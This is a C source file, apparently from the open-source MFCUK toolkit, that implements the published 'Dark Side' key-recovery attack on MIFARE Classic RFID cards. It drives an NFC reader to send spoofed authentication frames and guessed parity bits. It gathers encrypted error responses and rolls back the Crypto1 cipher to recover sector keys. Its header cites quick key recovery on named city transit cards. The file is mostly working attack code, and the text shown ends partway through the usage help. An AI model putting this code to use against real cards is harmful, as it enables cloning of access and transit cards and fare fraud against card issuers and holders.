/*
 LICENSE

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 2 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*
 Package:
    MiFare Classic Universal toolKit (MFCUK)

 Filename:
    mfcuk_keyrecovery_darkside.c

 Name:
    Mifare Classic "Dark-Side" Attack to reover at least 1 key for card where NO keys
    are known. Uses as a corner-stone the lfsr_common_prefix() from crapto1 3.1

    After this, the MFOC from Nethemba team is used to recover rest of the
    keys using "Nested-Authentication" Attack

 Description:
    Implementing Mifare Classic "Dark Side" Key Recovery attack from this paper:
    "THE DARK SIDE OF SECURITY BY OBSCURITY"
    http://eprint.iacr.org/2009/137.pdf

    For tag fixation it uses the DROP FIELD and CONSTANT DELAY after drop and
    before authentication technique. Most of the times it gives pretty good results.

    To improve the overall results, the Nt tag nonces are stored and looked-up in
    a sorted array of Nt entries. We can see it as a hash map/lookup table with
    resumable states for given tag nonces.
        cons - extends the timeslot of attack
        pros - makes attack more stable since tag nonce fixation is not as accurate
                on ACR122 as on Proxmark3 or other specialized devices

 License:
    GPL2 (see below), Copyright (C) 2009, Andrei Costin

 OS/Envs supported:
    Linux
    Windows
    MacOS
    Cygwin

 Hardware tested/supported:
    ACR 122U (usb)

 Compiling:
    Linux/MacOS/Cygwin
        gcc -o zv_mf_dark_side zv_mf_dark_side.c ./crapto1-v3.1/crapto1.c
            ./crapto1-v3.1/crypto1.c ./libnfc-v1.2.1/bin/libnfc.lib -lnfc
            -I./libnfc-v1.2.1/include -L./libnfc-v1.2.1/lib
    MSVS
        just copy an existing project (nfc-anticol for example) from libnfc-1.2.1-vs2005,
        add the crapto1 .c files to the project and zv_mf_dark_side.c

 Usage:
    ./mfcuk_keyrecovery_darkside -h
    c:\mfcuk_keyrecovery_darkside.exe -h

 Results:
    about 2 minutes to recover first key for RATB Bucharest cards (10ms & 50ms sleeps)
    about 3 minutes to recover first key for EasyCard Taipei (10ms & 50ms sleeps)

 Known Issues:
    1. The tag fixation with ACR122 is not performing well if CPU is under high load (eg. Flash Movie playing in IE, etc.)
    2. Either a bug in libnfc 1.2.1 or a bug in RATB card-types 0x88 consecutive authentication goes like - one fails, one ok, even though correct keys are used
        2.a Maybe need to check AC bits?
        2.b Maybe AC bits/0x88 cards need a read/write or failed operation in between for the "state" to be ok and next auth to be successful?

 Contact, bug-reports:
    http://andreicostin.com/
    mailto:zveriu@gmail.com

 Requirements:
    crapto1 library 3.1        (http://code.google.com/p/crapto1)
    libnfc 1.4.2               (http://www.libnfc.org)

 * @file mfcuk.c
*/

/*
 VERSION HISTORY
--------------------------------------------------------------------------------
| Number     : 0.1
| dd/mm/yyyy : 14/11/2009
| Author     : zveriu@gmail.com, http://andreicostin.com
| Description: Initial version as POC, Windows MS Visual Studio version only
--------------------------------------------------------------------------------
| Number     : 0.2
| dd/mm/yyyy : 14/11/2009
| Author     : zveriu@gmail.com, http://andreicostin.com
| Description: Fixed some info; removed uneeded code, variables, commented lines;
| proper identation; introduced some portability fixes;
--------------------------------------------------------------------------------
| Number     : 0.3
| dd/mm/yyyy : 14/11/2009
| Author     : zveriu@gmail.com, http://andreicostin.com
| Description: Restructured the functionality into reusable modules, preparing
| for MFCUK package and integration with MFOC; autogen and automake packaging;
--------------------------------------------------------------------------------
*/

#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

#if defined(HAVE_SYS_TYPES_H)
#  include <sys/types.h>
#endif

#if defined(HAVE_SYS_ENDIAN_H)
#  include <sys/endian.h>
#endif

#if defined(HAVE_ENDIAN_H)
#  include <endian.h>
#endif

#if defined(HAVE_COREFOUNDATION_COREFOUNDATION_H)
#  include <CoreFoundation/CoreFoundation.h>
#endif

#if defined(HAVE_BYTESWAP_H)
#  include <byteswap.h>
#endif

#if defined (__GNUC__)
#  define GCC_VERSION (__GNUC__ * 100 + __GNUC_MINOR__ * 10)
#  if GCC_VERSION >= 430
// Since GCC >= 4.30, GCC provides __builtin_bswapXX() alternatives so we switch to them
#    undef bswap_16
#    define bswap_16 __builtin_bswap16
#    undef bswap_32
#    define bswap_32 __builtin_bswap32
#    undef bswap_64
#    define bswap_64 __builtin_bswap64
#  endif
#endif

// Fallback...
#if !defined (bswap_16) || !defined (bswap_32) || !defined (bswap_64)
//#  warning "No bswap function found! Using untested alternatives..."
static inline uint16_t bswap_16(uint16_t x)
{
  return (x >> 8) | (x << 8);
}

static inline uint32_t bswap_32(uint32_t x)
{
  return (bswap_16(x & 0xffff) << 16) | (bswap_16(x >> 16));
}

static inline uint64_t bswap_64(uint64_t x)
{
  return (((uint64_t)bswap_32(x & 0xffffffffull)) << 32) | (bswap_32(x >> 32));
}
#endif

#include <string.h>
#include <err.h>
#include <errno.h>

#include "xgetopt.h"

// NFC
#include <nfc/nfc.h>
#include <nfc/nfc-types.h>

// Crapto1
#include "crapto1.h"

// imported from libnfc's examples
#include "mifare.h"
#include "nfc-utils.h"

// internal
#include "mfcuk_mifare.h"
#include "mfcuk_utils.h"
#include "mfcuk_finger.h"
#include "mfcuk.h"

#define MAX_FRAME_LEN       264

#ifdef DEBUG
#  warning Debug mode is enabled
#  define WARN(...) fprintf(stderr, "%s %d: ", __FILE__, __LINE__ ); warnx ("  WARNING: " __VA_ARGS__ )
#  define ERR(...)  fprintf(stderr, "%s %d: ", __FILE__, __LINE__ ); warnx ("  ERROR " __VA_ARGS__ )
#else
#  define WARN(...) warnx ("WARNING: " __VA_ARGS__ )
#  define ERR(...)  warnx ("ERROR: " __VA_ARGS__ )
#endif

static uint32_t bswap_32_pu8(uint8_t *pu8)
{
  // TODO: This function need to be tested on both endianness machine types
  return pu8[0] << 24 | pu8[1] << 16 | pu8[2] << 8 | pu8[3];
}

extern mfcuk_finger_tmpl_entry mfcuk_finger_db[];

extern int mfcuk_finger_db_entries;

uint8_t hicnt[1 << 24] = {0}, locnt[1 << 24] = {0};

uint8_t weak_mifare_threshold = 0;

// TODO: rename the array and number of items in array variable names
tag_nonce_entry_t arrSpoofEntries[MAX_TAG_NONCES]; // "Cache" array of already received tag nonces, since we cannot 100% fix one tag nonce as of now
uint32_t numSpoofEntries = 0; // Actual number of entries in the arrSpoofEntries
uint32_t numAuthAttempts = 0; // Number of authentication attempts for Recovery of keys - used to statistics. TODO: implement proper statistics with timings, number of tries, etc.
uint32_t numHit4 = 0; // Number of 4-bit responses
bool bfOpts[256] = {false}; // Command line options, indicates their presence, initialize with false
uint8_t verboseLevel = 0; // No verbose level by default

static const nfc_modulation nmMifare = {
  .nmt = NMT_ISO14443A,
  .nbr = NBR_106,
};

static int compareTagNonces(const void *a, const void *b)
{
  // TODO: test the improvement (especially corner cases, over/under-flows) "return ( (*(uint32_t*)a) - (*(uint32_t*)b) );
  if (*(uint32_t *)a > *(uint32_t *)b) return 1;
  if (*(uint32_t *)a == *(uint32_t *)b) return 0;
  if (*(uint32_t *)a < * (uint32_t *)b) return -1;

  return 0; // Never reach here, but keep compilers happy
}

// TODO: combine mfcuk_verify_key_block() with mfcuk_recover_key_block(), since a lot of code is duplicate
static uint32_t mfcuk_verify_key_block(nfc_device *pnd, uint32_t uiUID, uint64_t ui64Key, mifare_key_type bKeyType, uint8_t bTagType, uint32_t uiBlock)
{
  uint32_t pos;

  // Keystream related variables - for verification with Crapto1/Crypto1 rollback
  uint32_t nr_encrypted = 0;
  uint32_t reader_response = 0;
  uint32_t tag_response = 0;
  uint32_t ks2 = 0;
  uint32_t ks3 = 0;
  struct Crypto1State *pcs;
  uint64_t lfsr;

  // Communication related variables
  uint8_t abtAuth[4]        = { 0x00, 0x00, 0x00, 0x00 };
  uint8_t abtArEnc[8]       = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint8_t abtArEncPar[8]    = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint8_t abtRx[MAX_FRAME_LEN];
  uint8_t abtRxPar[MAX_FRAME_LEN];
  uint32_t nt, nt_orig; // Supplied tag nonce

  if ((bKeyType != keyA) && (bKeyType != keyB)) {
    return MFCUK_FAIL_KEYTYPE_INVALID;
  }

  if (!IS_MIFARE_CLASSIC_1K(bTagType) && !IS_MIFARE_CLASSIC_4K(bTagType)) {
    return MFCUK_FAIL_TAGTYPE_INVALID;
  }

  if (!is_valid_block(bTagType, uiBlock)) {
    return MFCUK_FAIL_BLOCK_INVALID;
  }

  // Configure the authentication frame using the supplied block
  abtAuth[0] = bKeyType;
  abtAuth[1] = uiBlock;
  iso14443a_crc_append(abtAuth, 2);

  // Now we take over, first we need full control over the CRC
  if (0 > nfc_device_set_property_bool(pnd, NP_HANDLE_CRC, false)) {
    return MFCUK_FAIL_COMM;
  }

  // We need to disable EASY_FRAMING feature to talk in "raw" mode
  nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, false);

  // Request plain tag-nonce
  if (0 > nfc_initiator_transceive_bytes(pnd, abtAuth, 4, abtRx, sizeof(abtRx), -1)) {
    return MFCUK_FAIL_COMM;
  }
  nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, true);

  // Save the tag nonce (nt)
  nt = bswap_32_pu8(abtRx);
  nt_orig = nt;

  // Init cipher with key
  pcs = crypto1_create(ui64Key);

  // Load (plain) uid^nt into the cipher
  for (pos = 0; pos < 4; pos++) {
    // Update the cipher with the tag-initialization
    crypto1_byte(pcs, ((uiUID >> (8 * (3 - pos))) & 0xFF) ^ abtRx[pos], 0);
  }

  // Generate (encrypted) nr+parity by loading it into the cipher (Nr)
  for (pos = 0; pos < 4; pos++) {
    // Load in, and encrypt, the reader nonce (plain nr=0x00000000)
    abtArEnc[pos] = crypto1_byte(pcs, 0x00, 0) ^ 0x00;

    // Encrypt the parity bits for the 4 plaintext bytes of nr
    abtArEncPar[pos] = filter(pcs->odd) ^ oddparity(0x00);

    // Get the keystream encrypted Nr value currently loaded into the cypher, i.e. {Nr}
    nr_encrypted = nr_encrypted << 8;
    nr_encrypted = nr_encrypted | abtArEnc[pos];
  }

  // Skip 32 bits in pseudo random generator
  nt = prng_successor(nt, 32);

  // Generate reader-answer from tag-nonce (Ar)
  for (pos = 4; pos < 8; pos++) {
    // Get the next random byte for verify the reader to the tag
    nt = prng_successor(nt, 8);

    // Encrypt the reader-answer (nt' = suc2(nt))
    abtArEnc[pos] = crypto1_byte(pcs, 0x00, 0) ^(nt & 0xff);

    // Encrypt the parity bits for the 4 plaintext bytes of nt'
    abtArEncPar[pos] = filter(pcs->odd) ^ oddparity(nt & 0xff);

    // Get the keystream encrypted reader response currently loaded into the cypher, i.e. {Ar}
    reader_response = reader_response << 8;
    reader_response = reader_response | abtArEnc[pos];
  }

  // Finally we want to send arbitrary parity bits
  if (0 > nfc_device_set_property_bool(pnd, NP_HANDLE_PARITY, false)) {
    return MFCUK_FAIL_COMM;
  }

  int res;
  if (0 > (res = nfc_initiator_transceive_bits(pnd, abtArEnc, 64, abtArEncPar, abtRx, sizeof(abtRx), abtRxPar))) {
    return MFCUK_FAIL_AUTH;
  }

  crypto1_destroy(pcs);

  if (res == 32) {
    for (pos = 0; pos < 4; pos++) {
      tag_response = tag_response << 8;
      tag_response = tag_response | abtRx[pos];
    }

    ks2 = reader_response ^ prng_successor(nt_orig, 64);
    ks3 = tag_response ^ prng_successor(nt_orig, 96);
    pcs = lfsr_recovery64(ks2, ks3);

    lfsr_rollback_word(pcs, 0, 0);
    lfsr_rollback_word(pcs, 0, 0);
    lfsr_rollback_word(pcs, nr_encrypted, 1);
    lfsr_rollback_word(pcs, uiUID ^ nt_orig, 0);
    crypto1_get_lfsr(pcs, &lfsr);

    crypto1_destroy(pcs);

    if (lfsr != ui64Key) {
      return MFCUK_FAIL_CRAPTO;
    }
  } else {
    return MFCUK_FAIL_AUTH;
  }

  return MFCUK_SUCCESS;
}

static uint32_t mfcuk_key_recovery_block(nfc_device *pnd, uint32_t uiUID, uint64_t ui64Key, mifare_key_type bKeyType, uint8_t bTagType, uint32_t uiBlock, uint64_t *ui64KeyRecovered)
{
  // Communication variables
  uint32_t pos, pos2, nt;
  struct Crypto1State *pcs;
  uint8_t abtAuth[4]        = { 0x60, 0x00, 0x00, 0x00 };
  uint8_t abtArEnc[8]       = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint8_t abtArEncPar[8]    = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint8_t abtRx[MAX_FRAME_LEN];
  uint8_t abtRxPar[MAX_FRAME_LEN];

  // zveriu
  static uint32_t nt_orig = 0;
  char sendSpoofAr = 0; // We want to spoof the Ar response with all 0s and the use random parity bits for that Nt until we have a successful 4 bits response (0x5)
  tag_nonce_entry_t *ptrFoundTagNonceEntry = NULL;

  // Key-recovery variables
  struct Crypto1State *states_list;
  struct Crypto1State *current_state;
  uint32_t i;
  uint64_t key_recovered;
  uint8_t flag_key_recovered = 0; // FIXME: fix the {Nr} iteration properly. This a quick fix for cases when 0xDEADBEEF {Nr} is not working

  if ((bKeyType != keyA) && (bKeyType != keyB)) {
    return MFCUK_FAIL_KEYTYPE_INVALID;
  }

  if (!IS_MIFARE_CLASSIC_1K(bTagType) && !IS_MIFARE_CLASSIC_4K(bTagType)) {
    return MFCUK_FAIL_TAGTYPE_INVALID;
  }

  if (!is_valid_block(bTagType, uiBlock)) {
    return MFCUK_FAIL_BLOCK_INVALID;
  }

  // Configure the authentication frame using the supplied block
  abtAuth[0] = bKeyType;
  abtAuth[1] = uiBlock;
  iso14443a_crc_append(abtAuth, 2);

  // Now we take over, first we need full control over the CRC
  nfc_device_set_property_bool(pnd, NP_HANDLE_CRC, false);

  // We need to disable EASY_FRAMING feature to talk in "raw" mode
  nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, false);

  // Request plain tag-nonce
  //printf("Nt: ");
  if (0 > nfc_initiator_transceive_bytes(pnd, abtAuth, 4, abtRx, sizeof(abtRx), -1)) {
    //printf("\n\nFAILURE - Failed to get TAG NONCE!!!\n\n");
    return MFCUK_FAIL_COMM;
  }
  nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, true);

  //print_hex(abtRx,4);

  // Save the tag nonce (nt)
  nt = bswap_32_pu8(abtRx);

  // zveriu
  //printf("INFO - Nonce distance %d (from 0x%08x, to 0x%08x)\n", nonce_distance(nt, nt_orig), nt, nt_orig);
  nt_orig = nt;

  // Max log(2, MAX_TAG_NONCES) searches, i.e. log(2, 65536) = 16
  ptrFoundTagNonceEntry = (tag_nonce_entry_t *) bsearch((void *)(&nt_orig), arrSpoofEntries, numSpoofEntries, sizeof(arrSpoofEntries[0]), compareTagNonces);

  // A new tag nonce detected, initialize it properly and store in the tag nonce "cache" array for use in it's next appearances
  if (!ptrFoundTagNonceEntry) {
    if (numSpoofEntries >= MAX_TAG_NONCES) {
      //printf("\n\nFAILURE - REACHED MAX_TAG_NONCES!!! (Are we so unlucky or the USB/reader is buggy?!)\n\n");
      return MFCUK_FAIL_MEMORY;
    }

    arrSpoofEntries[numSpoofEntries].tagNonce = nt_orig;
    arrSpoofEntries[numSpoofEntries].num_of_appearances = 1;
    numSpoofEntries++;

    // Max log(2, MAX_TAG_NONCES) searches, i.e. log(2, 65536) = 16
    qsort(arrSpoofEntries, numSpoofEntries, sizeof(arrSpoofEntries[0]), compareTagNonces);

    ptrFoundTagNonceEntry = (tag_nonce_entry_t *) bsearch((void *)(&nt_orig), arrSpoofEntries, numSpoofEntries, sizeof(arrSpoofEntries[0]), compareTagNonces);

    // Put the initializations done in abtRxLen == 32 section here also because maybe we don't know the key actually
    ptrFoundTagNonceEntry->spoofFlag = 1;

    // Hardcoding {Nr} and {Ar} and try to guess parity bits
    ptrFoundTagNonceEntry->spoofNrEnc = MFCUK_DARKSIDE_START_NR;
    ptrFoundTagNonceEntry->spoofArEnc = MFCUK_DARKSIDE_START_AR;
    ptrFoundTagNonceEntry->spoofParBitsEnc = 0x0;

    // First we need to satisfy STAGE1
    ptrFoundTagNonceEntry->current_out_of_8 = -1;
  } else {
    ptrFoundTagNonceEntry->num_of_appearances++;


    if ( // If we went beyond MFCUK_DARKSIDE_MAX_LEVELS without findind a key, need to check next {Nr}
      (ptrFoundTagNonceEntry->current_out_of_8 >= MFCUK_DARKSIDE_MAX_LEVELS) ||
      // Can have only 32 combinations of the last 5 bits of parity bits which generated the first NACK
      ((ptrFoundTagNonceEntry->current_out_of_8 >= 0) && (ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8] >= 0x20))
    ) {
      // If no key discovered for current {Nr}, {Ar}, 29bit-prefix, go back to satisfy STAGE1 with other {Nr} value, {Ar} we keep the same
      ptrFoundTagNonceEntry->spoofNrEnc++;
      ptrFoundTagNonceEntry->spoofArEnc = MFCUK_DARKSIDE_START_AR;
      ptrFoundTagNonceEntry->spoofParBitsEnc = 0x0;
      ptrFoundTagNonceEntry->current_out_of_8 = -1;

      return MFCUK_FAIL_AUTH;
    }

    /*
    // TODO: if above block is working fine, delete this commented - above one created to reduce code-duplication
    // If we went beyond MFCUK_DARKSIDE_MAX_LEVELS without findind a key, need to check next {Nr}
    if (ptrFoundTagNonceEntry->current_out_of_8 >= MFCUK_DARKSIDE_MAX_LEVELS)
    {
        //printf("FAILURE - This Nt, {Pfx}, consecutive {Nr}s and {ParBits} combination cannot produce a key-recoverable state\n");
        //printf("\tINFO: try changing initial {Nr}, {Ar} and timings of sleepmillis()\n");

        //printf("{Nr} is not a DEADBEEF.... Need to find BEEF ALIVE!... Trying next one...\n");
        ptrFoundTagNonceEntry->spoofNrEnc++;
        ptrFoundTagNonceEntry->spoofArEnc = 0xFACECAFE;
        ptrFoundTagNonceEntry->spoofParBitsEnc = 0x0;

        // If no key discovered for current {Nr}, {Ar}, 29bit-prefix, go back to satisfy STAGE1 with other {Nr} value, {Ar} we keep the same
        ptrFoundTagNonceEntry->current_out_of_8 = -1;

        return MFCUK_FAIL_AUTH;
    }

    if (ptrFoundTagNonceEntry->current_out_of_8 >= 0)
    {
        // Can have only 32 combinations of the last 5 bits of parity bits which generated the first NACK
        if (ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8] >= 0x20)
        {
            //printf("FAILURE - This consecutive {Nr}s and {ParBits} combination cannot produce all 8 required NACKs and KSs of NACKs\n");
            //printf("\tINFO: try changing initial {Nr}, {Ar} and timings of sleepmillis()\n");

            //printf("{Nr} is not a DEADBEEF.... Need to find BEEF ALIVE!... Trying next one...\n");
            ptrFoundTagNonceEntry->spoofNrEnc++;
            ptrFoundTagNonceEntry->spoofArEnc = 0xFACECAFE;
            ptrFoundTagNonceEntry->spoofParBitsEnc = 0x0;

            // If no key discovered for current {Nr}, {Ar}, 29bit-prefix, go back to satisfy STAGE1 with other {Nr} value, {Ar} we keep the same
            ptrFoundTagNonceEntry->current_out_of_8 = -1;

            return MFCUK_FAIL_AUTH;
        }
    }
    */
  }

  sendSpoofAr = ptrFoundTagNonceEntry->spoofFlag;

  // Init cipher with key
  pcs = crypto1_create(ui64Key);

  // Load (plain) uid^nt into the cipher
  for (pos = 0; pos < 4; pos++) {
    // Update the cipher with the tag-initialization
    // TODO: remove later - crypto1_byte(pcs, pbtUid[pos]^abtRx[pos], 0);
    crypto1_byte(pcs, ((uiUID >> (8 * (3 - pos))) & 0xFF) ^ abtRx[pos], 0);
  }

  // Generate (encrypted) nr+parity by loading it into the cipher (Nr)
  for (pos = 0; pos < 4; pos++) {
    // Load in, and encrypt, the reader nonce (plain nr=0x00000000)
    abtArEnc[pos] = crypto1_byte(pcs, 0x00, 0) ^ 0x00;

    // Encrypt the parity bits for the 4 plaintext bytes of nr
    abtArEncPar[pos] = filter(pcs->odd) ^ oddparity(0x00);

    if (sendSpoofAr) {
      if (ptrFoundTagNonceEntry->current_out_of_8 < 0) {
        abtArEnc[pos] = (ptrFoundTagNonceEntry->spoofNrEnc >> (8 * (3 - pos))) & 0xFF;
        abtArEncPar[pos] = (ptrFoundTagNonceEntry->spoofParBitsEnc >> (7 - pos)) & 0x01;
      } else {
        abtArEnc[pos] = (ptrFoundTagNonceEntry->nrEnc[ptrFoundTagNonceEntry->current_out_of_8] >> (8 * (3 - pos))) & 0xFF;
        abtArEncPar[pos] = ((ptrFoundTagNonceEntry->parBits[ptrFoundTagNonceEntry->current_out_of_8] + ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8]) >> (7 - pos)) & 0x01;
      }
    }
  }

  // Skip 32 bits in pseudo random generator
  nt = prng_successor(nt, 32);

  // Generate reader-answer from tag-nonce (Ar)
  for (pos = 4; pos < 8; pos++) {
    // Get the next random byte for verify the reader to the tag
    nt = prng_successor(nt, 8);

    // Encrypt the reader-answer (nt' = suc2(nt))
    abtArEnc[pos] = crypto1_byte(pcs, 0x00, 0) ^(nt & 0xff);
    // Encrypt the parity bits for the 4 plaintext bytes of nt'
    abtArEncPar[pos] = filter(pcs->odd) ^ oddparity(nt & 0xff);

    // zveriu - Make the Ar incorrect, but leave parity bits calculated/guessed_spoofed as above
    /* If all eight parity bits are correct, but the answer Ar is
    wrong, the tag responds with the 4-bit error code 0x5
    signifying failed authentication, called transmission error in [KHG08].
    */
    if (sendSpoofAr) {
      if (ptrFoundTagNonceEntry->current_out_of_8 < 0) {
        abtArEnc[pos] = (ptrFoundTagNonceEntry->spoofArEnc >> (8 * (7 - pos))) & 0xFF;
        abtArEncPar[pos] = (ptrFoundTagNonceEntry->spoofParBitsEnc >> (7 - pos)) & 0x01;
      } else {
        abtArEnc[pos] = (ptrFoundTagNonceEntry->arEnc[ptrFoundTagNonceEntry->current_out_of_8] >> (8 * (7 - pos))) & 0xFF;
        abtArEncPar[pos] = ((ptrFoundTagNonceEntry->parBits[ptrFoundTagNonceEntry->current_out_of_8] + ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8]) >> (7 - pos)) & 0x01;
      }
    }
  }

  if (ptrFoundTagNonceEntry->current_out_of_8 >= 0) {
    // Prepare for the next round (if this one is not successful) the next 5 bit combination for current parity bits
    ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8]++;
  }

  // Finally we want to send arbitrary parity bits
  nfc_device_set_property_bool(pnd, NP_HANDLE_PARITY, false);

  // Transmit reader-answer
  //printf(" Ar: ");
  //print_hex_par(abtArEnc,64,abtArEncPar);

  int res;
  if (0 > (res = nfc_initiator_transceive_bits(pnd, abtArEnc, 64, abtArEncPar, abtRx, sizeof(abtRx), abtRxPar))) {
    if (sendSpoofAr) {
      ptrFoundTagNonceEntry->spoofParBitsEnc++;
    }

    return MFCUK_FAIL_AUTH;
  }

  // zveriu - Successful: either authentication (szRx == 32) either encrypted 0x5 reponse (szRx == 4)
  if (res == 4) {
    ++numHit4;
    //printf("INFO - 4-bit (szRx=%d) error code 0x5 encrypted (abtRx=0x%02x)\n", szRx, abtRx[0] & 0xf);

    if (ptrFoundTagNonceEntry->current_out_of_8 < 0) {
      ptrFoundTagNonceEntry->spoofNackEnc = abtRx[0] & 0xf;
      ptrFoundTagNonceEntry->spoofKs = ptrFoundTagNonceEntry->spoofNackEnc ^ 0x5;
      ptrFoundTagNonceEntry->spoofNrPfx = ptrFoundTagNonceEntry->spoofNrEnc & 0xFFFFFF1F;

      // Initialize the {Nr} with proper 29 bits prefix and {Par} with proper 3 bits prefix
      for (pos = 0; pos < 8; pos++) {
        ptrFoundTagNonceEntry->nrEnc[pos] = ptrFoundTagNonceEntry->spoofNrPfx | pos << 5;
        ptrFoundTagNonceEntry->arEnc[pos] = ptrFoundTagNonceEntry->spoofArEnc;
        ptrFoundTagNonceEntry->parBits[pos] = ptrFoundTagNonceEntry->spoofParBitsEnc & 0xE0;
        ptrFoundTagNonceEntry->parBitsCrntCombination[pos] = 0;
      }

      // Mark the begining of collecting STAGE2 probes
      ptrFoundTagNonceEntry->current_out_of_8 = 0;
    } else {
      ptrFoundTagNonceEntry->nackEnc[ptrFoundTagNonceEntry->current_out_of_8] = abtRx[0] & 0xf;
      ptrFoundTagNonceEntry->ks[ptrFoundTagNonceEntry->current_out_of_8] = ptrFoundTagNonceEntry->nackEnc[ptrFoundTagNonceEntry->current_out_of_8] ^ 0x5;
      ptrFoundTagNonceEntry->current_out_of_8++;

      if (ptrFoundTagNonceEntry->current_out_of_8 == 8) {
        for (pos = 0; pos < 8; pos++) {
          for (pos2 = 0; pos2 < 8; pos2++) {
            ptrFoundTagNonceEntry->parBitsArr[pos][pos2] = ((ptrFoundTagNonceEntry->parBits[pos] + ptrFoundTagNonceEntry->parBitsCrntCombination[pos] - 1) >> (7 - pos2)) & 0x01;
          }
        }

        states_list = lfsr_common_prefix(ptrFoundTagNonceEntry->spoofNrPfx, ptrFoundTagNonceEntry->spoofArEnc, ptrFoundTagNonceEntry->ks, ptrFoundTagNonceEntry->parBitsArr);
	
	for (i = 0; (states_list) && ((states_list + i)->odd != 0 || (states_list + i)->even != 0) && (i < (MAX_COMMON_PREFIX_STATES<<4)); i++) {
          current_state = states_list + i;
          lfsr_rollback_word(current_state, uiUID ^ ptrFoundTagNonceEntry->tagNonce, 0);
          crypto1_get_lfsr(current_state, &key_recovered);
          ++hicnt[(key_recovered >> 24) & 0xffffff];
          ++locnt[key_recovered & 0xffffff];
          if(weak_mifare_mode == false) {
        	  if (bfOpts['v'] && (verboseLevel > 1)) {
        		  printf("\nINFO: block %d recovered KEY: %012"PRIx64"\n", uiBlock, key_recovered);
        	  }
        	  flag_key_recovered = 1;
        	  *ui64KeyRecovered = key_recovered;
          }
        }
	if(weak_mifare_mode == true) {
		if (bfOpts['v'] && (verboseLevel > 2))
			printf("\nINFO: %d candidates found, nonce %08x\n", i, ptrFoundTagNonceEntry->tagNonce);
		int maxhi = 0;
		int maxlo = 0;
		int maxhii = 0;
		int maxloi = 0;
		for (i = 0; i < (1 << 24); ++i) {
			if (hicnt[i] > maxhi){
				maxhi = hicnt[i];
				maxhii = i;
			}
			if (locnt[i] > maxlo){
				maxlo = locnt[i];
				maxloi = i;
			}
		}
		if (bfOpts['v'] && (verboseLevel > 2))
			printf("\nINFO: maxhi=%d maxhii=%08x maxlo=%d maxloi=%08x\n", maxhi, maxhii, maxlo, maxloi);
		if(maxhi >= weak_mifare_threshold && maxlo >= weak_mifare_threshold)
		{
			flag_key_recovered = 1;
			*ui64KeyRecovered = ((uint64_t)maxhii<<24) + maxloi;
			printf("\nINFO: block %d recovered KEY: %012"PRIx64"\n", uiBlock, *ui64KeyRecovered);
		}
	}

        crypto1_destroy(states_list);

        if (!flag_key_recovered) {
          //printf("{Nr} is not a DEADBEEF.... Need to find BEEF ALIVE!... Trying next one...\n");
          ptrFoundTagNonceEntry->spoofNrEnc++;
          ptrFoundTagNonceEntry->spoofArEnc = MFCUK_DARKSIDE_START_AR;
          ptrFoundTagNonceEntry->spoofParBitsEnc = 0x0;

          // If no key discovered for current {Nr}, {Ar}, 29bit-prefix, go back to satisfy STAGE1 with other {Nr} value, {Ar} we keep the same
          ptrFoundTagNonceEntry->current_out_of_8 = -1;

          return MFCUK_FAIL_CRAPTO;
        }
      }
    }
  } else if (res == 32) {
    // Are we so MFCUKing lucky (?!), since ui64Key is a "dummy" key
    flag_key_recovered = true;
    *ui64KeyRecovered = ui64Key;
  }

  //printf(" At: ");
  //print_hex_par(abtRx,szRx,abtRxPar);

  crypto1_destroy(pcs);

  if (flag_key_recovered) {
    return MFCUK_OK_KEY_RECOVERED;
  } else {
    return MFCUK_SUCCESS;
  }
}

/*
TODO:
- have an option with frequency of the display information, and with portable way of getting elapsed time
-m max_iterations - stop everything after so many iterations, default is infinite until all keys found
-T max_elapsed_time - stop after time elapsed
*/
static void print_usage(FILE *fp, const char *prog_name)
{
  fprintf(fp, "Usage:\n");
  fprintf(fp, "-C - require explicit connection to the reader. Without this option, the connection is not made and recovery will not occur\n");
  fprintf(fp, "-i mifare.dmp - load input mifare_classic_tag type dump\n");
  fprintf(fp, "-I mifare_ext.dmp - load input extended dump specific to this tool, has several more fields on top of mifare_classic_tag type dump\n");
  fprintf(fp, "-o mifare.dmp - output the resulting mifare_classic_tag dump to a given file\n");
  fprintf(fp, "-O mifare_ext.dmp - output the resulting extended dump to a given file\n");
  fprintf(fp, "-V sector[:A/B/any_other_alphanum[:fullkey]] - verify key for specified sector, -1 means all sectors\n");
  fprintf(fp, "\tAfter first semicolon key-type can specified: A verifies only keyA, B verifies only keyB, anything else verifies both keys\n");
  fprintf(fp, "\tAfter second semicolon full 12 hex-digits key can specified - this key will override any loaded dump key for the given sector(s) and key-type(s)\n");
  fprintf(fp, "-R sector[:A/B/any_other_alphanum] - recover key for sector, -1 means all sectors.\n");
  fprintf(fp, "\tAfter first semicolon key-type can specified: A recovers only keyA, B recovers only keyB, anything else recovers both keys\n");
  fprintf(fp, "-U UID - force specific UID. If a dump was loaded with -i, -U will overwrite the in the memory where dump was loaded\n");
  fprintf(fp, "-M tagtype - force specific tagtype. 8 is 1K, 24 is 4K, 32 is DESFire\n");
  fprintf(fp, "-D - for sectors and key-types marked for verification, in first place use default keys to verify (maybe you are lucky)\n");
  fprintf(fp, "-d key - specifies additional full 12 hex-digits default key to be checked. Multiple -d options can be used for more additional keys\n");
